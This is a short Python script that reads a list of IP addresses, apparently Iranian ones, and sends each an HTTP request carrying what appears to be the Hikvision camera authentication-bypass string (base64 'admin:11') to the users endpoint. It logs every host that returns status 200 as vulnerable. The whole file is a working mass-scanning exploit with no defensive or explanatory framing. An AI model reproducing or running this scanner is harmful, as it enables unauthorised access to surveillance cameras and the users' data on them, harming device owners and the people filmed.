import asyncio  
import aiohttp  

asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy()) 

with open('all-iran-ips.txt','r') as links : 
    links = links.read().split('\n')
    urls = []
    for i in links : 
        urls.append(i) 
urls = urls[:100]
with open('hik-result.txt','w') as file : 
    
    async def main():  
        session_timeout = aiohttp.ClientTimeout(total=None,sock_connect=0.1)
        async with aiohttp.ClientSession(timeout=session_timeout) as session:
            for url in urls :
                
                try : 
                    
                    async with session.get(f'http://{url}/Security/users?auth=YWRtaW46MTEK') as response:  
                        
                        if response.status == 200 : 
                            file.write(f'{url}:True\n')
                        
                except : 
                    pass
       
    asyncio.run(main())  
         